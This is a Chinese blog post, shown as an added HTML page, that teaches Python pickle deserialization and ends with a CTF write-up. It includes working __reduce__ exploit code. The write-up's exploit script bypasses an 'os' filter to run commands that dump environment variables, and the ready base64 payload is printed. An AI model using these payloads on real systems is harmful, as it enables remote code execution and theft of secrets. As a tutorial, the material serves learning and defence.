@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CH" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="技术,生活">
+
+<title>pickle反序列化 || L1uxsn&#39;Blog</title>
+<link rel="icon" href="https://L1uxsn.github.ioimages/default-cover.webp" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="pickle反序列化">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://l1uxsn.github.io/2026/07/15/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="L1uxsn&#39;Blog">
+<meta property="og:author" content="L1uxsn">
+
+  
+  
+  
+  <meta name="description" content="pickle反序列化pickle简介：与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="Home">
+                        
+                        Home
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="Archives">
+                        
+                        Archives
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="Tags">
+                        
+                        Tags
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="Links">
+                        
+                        Links
+                    </a>
+                </li>
+            
+            
+                <li>
+                    <button class="search-toggle-btn" aria-label="Open search">
+                        <img src="/images/menu_ico/search.svg" class="menu-icon" alt="search">
+                        Search
+                    </button>
+                </li>
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+    
+<script src="/js/search.js"></script>
+
+
+    
+        <!-- 搜索模态框 -->
+        <div id="search-modal" class="search-modal">
+          <div class="search-modal-content">
+            <div class="search-header">
+              <form class="search-form" action="#" onsubmit="return false;">
+                <input type="text" id="search-input" placeholder="Search for articles" autocomplete="off">
+                <button type="button" class="search-close-btn" aria-label="Close">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                  </svg>
+                </button>
+              </form>
+            </div>
+            <div id="search-results"></div>
+          </div>
+        </div>
+
+        <script>
+        // 向全局对象添加i18n数据，以便search.js使用
+        window.WANG_THEME = window.WANG_THEME || {};
+        window.WANG_THEME.i18n = {
+          search: {
+            noResults: 'No results found',
+            loading: 'Loading...',
+            placeholder: 'Search for articles',
+            close: 'Close',
+            shortcut_tip: 'Press ESC to close',
+            toggle_search: 'Open search',
+            error_loading: 'Failed to load search data'
+          }
+        };
+        </script>
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">L1uxsn'Blog</h2>
+        <img class="avatar avatar-round" src="/images/avatar.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">L1uxsn</h2>
+        <h3 class="site-subtitle">分享技术和生活</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a href="https://L1uxsn.github.io" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="mailto:3586323056@qq.com" aria-label="Email的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/envelope.svg" class="icon" alt="Email的图标"><p>Email</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title">pickle反序列化</h1>
+
+    <div class="post-meta">
+      <span class="post-date">Posted on <time datetime="2026-07-15T14:25:10.000Z">2026-07-15</time></span>
+      
+        <span class="post-categories">
+          Category：<a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+        </span>
+      
+      
+        <span class="post-updated">
+          Last Updated <time datetime="2026-07-17T17:37:56.378Z">2026-07-18</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><h2 id="pickle简介："><a href="#pickle简介：" class="headerlink" title="pickle简介："></a>pickle简介：</h2><ul>
+<li><p>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</p>
+</li>
+<li><p>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。</p>
+</li>
+<li><p>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</p>
+</li>
+<li><p>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>pickle.dumps()</strong></th>
+<th>序列化</th>
+<th>将 Python 对象转换为字节流</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>pickle.loads()</strong></td>
+<td>反序列化</td>
+<td>将字节流恢复为 Python 对象</td>
+</tr>
+</tbody></table>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化</span></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">serialized = pickle.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(serialized)  <span class="comment"># b&#x27;\x80\x04\x95\x1f\x00\x00\x00\x00\x00\x00\x00&#125;\x94...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反序列化</span></span><br><span class="line">deserialized = pickle.loads(serialized)</span><br><span class="line"><span class="built_in">print</span>(deserialized)  <span class="comment"># &#123;&#x27;name&#x27;: &#x27;Alice&#x27;, &#x27;age&#x27;: 30&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png"></p>
+<h2 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h2><ul>
+<li><code>None</code> 、 <code>True</code> 和 <code>False</code></li>
+<li>整数、浮点数、复数</li>
+<li>str、byte、bytearray</li>
+<li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li>
+<li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li>
+<li>定义在模块最外层的内置函数</li>
+<li>定义在模块最外层的类</li>
+<li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li>
+</ul>
+<h2 id="reduce-函数"><a href="#reduce-函数" class="headerlink" title="__reduce__()函数"></a><code>__reduce__()</code>函数</h2><p><strong>当一个类定义了 <code>__reduce__</code> 方法，pickle 在序列化时会调用它，该方法应返回一个元组，告诉 pickle 如何重建对象</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回 (可调用对象, 参数元组)</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">print</span>, (<span class="string">&quot;Hello from __reduce__!&quot;</span>))</span><br><span class="line">  </span><br><span class="line">obj = MyClass()</span><br><span class="line">pickle.loads(pickle.dumps(obj))  <span class="comment"># 反序列化时会调用 print(&quot;Hello from __reduce__!&quot;)</span></span><br><span class="line"></span><br><span class="line">元组的含义(可以理解为第一个参数是函数，后面的参数都是该函数的参数)</span><br><span class="line">(<span class="built_in">print</span>, (<span class="string">&quot;Hello from __reduce__!&quot;</span>,)) 是一个元组，包含两个元素：</span><br><span class="line"></span><br><span class="line">第一个元素：<span class="built_in">print</span>（函数对象）</span><br><span class="line"></span><br><span class="line">第二个元素：(<span class="string">&quot;Hello from __reduce__!&quot;</span>)（参数元组）</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理:"></a>漏洞原理:</h2><p>Pickle 反序列化时，会<strong>执行 <code>__reduce__</code> 返回的任何可调用对象</strong>。如果攻击者可以控制反序列化的数据，就能构造恶意 <code>__reduce__</code> 返回任意函数（如 <code>os.system</code>），实现远程代码执行</p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 反序列化时会执行 os.system(&quot;whoami&quot;)</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&quot;whoami&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击者构造恶意 payload</span></span><br><span class="line">evil_payload = pickle.dumps(Evil())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 受害者反序列化</span></span><br><span class="line">pickle.loads(evil_payload)  <span class="comment"># 执行 whoami 命令</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"></p>
+<h2 id="pickle过程详解"><a href="#pickle过程详解" class="headerlink" title="pickle过程详解"></a>pickle过程详解</h2><ul>
+<li>pickle解析依靠Pickle Virtual Machine (PVM)进行。</li>
+<li>PVM涉及到三个部分：1. 解析引擎 2. 栈 3. 内存：</li>
+<li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li>
+<li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li>
+<li>memo：由Python的dict实现，为PVM的生命周期提供存储。说人话：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。</li>
+</ul>
+<p><strong>opcode:（Operation Code，操作码）是指令的二进制表示，告诉计算机”要执行什么操作”</strong></p>
+<p><strong>在 Python pickle 的语境中，opcode 是 pickle 协议中的单字节指令，用于指导反序列化过程如何重建对象</strong></p>
+<h4 id="opcode版本"><a href="#opcode版本" class="headerlink" title="opcode版本"></a>opcode版本</h4><ul>
+<li>pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出：</span></span><br><span class="line">pickle版本<span class="number">0</span> <span class="string">b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;</span></span><br><span class="line">pickle版本<span class="number">1</span> <span class="string">b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">2</span> <span class="string">b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">3</span> <span class="string">b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>pickle3版本的opcode示例：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x27;abcd&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x80\x03X\x04\x00\x00\x00abcdq\x00.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \x80：协议头声明 \x03：协议版本</span></span><br><span class="line"><span class="comment"># \x04\x00\x00\x00：数据长度：4</span></span><br><span class="line"><span class="comment"># abcd：数据</span></span><br><span class="line"><span class="comment"># q：储存栈顶的字符串长度：一个字节（即\x00）</span></span><br><span class="line"><span class="comment"># \x00：栈顶位置</span></span><br><span class="line"><span class="comment"># .：数据截止</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>pickle0版本的部分opcode表格：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Opcode</th>
+<th>Mnemonic</th>
+<th>Data type loaded onto the stack</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>S</td>
+<td>STRING</td>
+<td>String</td>
+<td>S’foo’\n</td>
+</tr>
+<tr>
+<td>V</td>
+<td>UNICODE</td>
+<td>Unicode</td>
+<td>Vfo\u006f\n</td>
+</tr>
+<tr>
+<td>I</td>
+<td>INTEGER</td>
+<td>Integer</td>
+<td>I42\n</td>
+</tr>
+<tr>
+<td>…</td>
+<td>…</td>
+<td>…</td>
+<td>…</td>
+</tr>
+</tbody></table>
+<h2 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h2><p><strong>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import pickletools</span><br><span class="line"></span><br><span class="line">data=b&quot;\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;q\x01\x85q\x02Rq\x03.&quot;</span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h2><p><strong>利用思路</strong></p>
+<ul>
+<li>任意代码执行或命令执行</li>
+<li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的</li>
+</ul>
+<h3 id="初步认识：pickle-EXP的简单demo"><a href="#初步认识：pickle-EXP的简单demo" class="headerlink" title="初步认识：pickle EXP的简单demo"></a>初步认识：pickle EXP的简单demo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class genpoc(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        s = &quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;  # 要执行的命令</span><br><span class="line">        return os.system, (s,)        # reduce函数必须返回元组或字符串</span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"></span><br><span class="line">print(poc) # 此时，如果 pickle.loads(poc)，就会执行命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png"></p>
+<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">key1 = b&#x27;321&#x27;</span><br><span class="line">key2 = b&#x27;123&#x27;</span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec,(&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">pickle_a = pickle.dumps(a)</span><br><span class="line">print(pickle_a)</span><br><span class="line">pickle.loads(pickle_a)</span><br><span class="line">print(key1, key2)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png"></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="HZNUCTF-2023-preliminary-pickle"><a href="#HZNUCTF-2023-preliminary-pickle" class="headerlink" title="[HZNUCTF 2023 preliminary]pickle"></a>[HZNUCTF 2023 preliminary]pickle</h3><ul>
+<li>1.进入题目，发现直接给出了python源码</li>
+</ul>
+<p><img src="/img/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"></p>
+<p>整理后如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">源码:</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/calc&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>():</span><br><span class="line">    </span><br><span class="line">    payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">    decoded = base64.b64decode(payload)</span><br><span class="line">    filtered = decoded.replace(<span class="string">b&#x27;os&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    pickle.loads(filtered)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ganbadie!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/readFile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readFile</span>():</span><br><span class="line">    </span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    safe_filename = filename.replace(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;????&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(safe_filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>2.分析源码:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">执行流程：</span><br><span class="line"></span><br><span class="line">从 URL 参数 payload 获取用户输入</span><br><span class="line"></span><br><span class="line">对输入进行 Base64 解码</span><br><span class="line"></span><br><span class="line">将解码后的内容中的 os 字符串删除</span><br><span class="line"></span><br><span class="line">对处理后的数据进行 pickle 反序列化</span><br><span class="line"></span><br><span class="line">漏洞：pickle.loads() 可以执行任意代码！攻击者可以构造恶意数据，在服务器上执行系统命令</span><br><span class="line"></span><br><span class="line">绕过难点：代码会删除 os 字符串，导致不能直接使用 os.system 或 os.popen</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>3.构造:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">exp:</span><br><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        # 使用 eval 和字符串拼接完美绕过 b&#x27;os&#x27; 过滤</span><br><span class="line">        # 执行命令导出环境变量到 a.txt</span><br><span class="line">        return (eval, (&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;env &gt; a.txt&#x27;)&quot;,))#(使用内置函数eval,调用os模块中的system()函数)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    a = A()</span><br><span class="line">    # 序列化</span><br><span class="line">    raw_pickle = pickle.dumps(a)</span><br><span class="line"></span><br><span class="line">    # Base64 编码并转为字符串</span><br><span class="line">    b64_payload = base64.b64encode(raw_pickle).decode()</span><br><span class="line"></span><br><span class="line">    # URL 编码，保护 payload 在 HTTP GET 请求中不被破坏(此时直接进行提交的话url会将base字符串中的+编码为空格，导致提交失败，所以这里需要进行一次url编码进行保护)</span><br><span class="line">    safe_payload = urllib.parse.quote(b64_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(f&quot;/calc?payload=&#123;safe_payload&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">payload:</span><br><span class="line">gAWVRQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwpX19pbXBvcnRfXygnbycrJ3MnKS5zeXN0ZW0oJ2VudiA%2BIGEudHh0JymUhZRSlC4%3D</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>4.进行提交:</li>
+</ul>
+<p><img src="/img/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png"></p>
+<p>输出ganbadie!说明执行成功</p>
+<ul>
+<li>5.利用<code>/readFile?filename=a.txt</code>，读取a.txt(环境变量)</li>
+</ul>
+<p><img src="/img/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png"></p>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>Author</p>
+                        <p>L1uxsn</p>
+                    </div>
+                    <div class="title">
+                        <p>Title</p>
+                        <p>pickle反序列化</p>
+                    </div>
+                        <div class="publish">
+                            <p>Published</p>
+                            <p>2026-07-15</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>CC-BY-NC-SA 4.0</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+      <div class="post-prev">
+        <span class="nav-label">Previous Post</span>
+        <a href="/2026/07/15/%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/">其他类型的数据库的注入</a>
+      </div>
+    
+    
+      <div class="post-next">
+        <span class="nav-label">Next Post</span>
+        <a href="/2026/07/16/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">python原型链污染</a>
+      </div>
+    
+  </nav>
+  
+<link href="https://unpkg.com/@waline/client@v3/dist/waline.css" rel="stylesheet">
+<div class="comments-container night">
+    <div id="waline"></div>
+    <script type="module">
